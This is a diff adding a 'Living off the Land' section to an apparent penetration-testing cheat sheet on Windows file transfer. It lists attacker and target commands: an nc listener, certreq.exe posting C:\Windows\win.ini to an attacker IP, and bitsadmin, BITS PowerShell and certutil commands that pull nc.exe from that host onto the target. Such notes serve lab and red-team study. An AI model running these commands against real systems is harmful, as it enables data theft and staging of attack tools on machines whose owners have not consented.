@@ -455,3 +455,41 @@ Then access:
 ```text
 \\tsclient\
 ```
+
+## Living off the Land
+
+### Windows
+
+#### `certreq.exe` — Target → Attacker
+
+```bash
+# Attacker
+sudo nc -lvnp 8000
+```
+
+```cmd
+:: Target
+certreq.exe -Post -config http://10.10.10.32:8000/ C:\Windows\win.ini
+```
+
+#### BITS — Attacker → Target
+
+```cmd
+bitsadmin /transfer wcb /priority foreground http://10.10.10.32:8000/nc.exe C:\Windows\Temp\nc.exe
+```
+
+```powershell
+Import-Module BitsTransfer
+
+Start-BitsTransfer `
+    -Source "http://10.10.10.32:8000/nc.exe" `
+    -Destination "C:\Windows\Temp\nc.exe"
+```
+
+#### `certutil.exe` — Attacker → Target
+
+```cmd
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+---
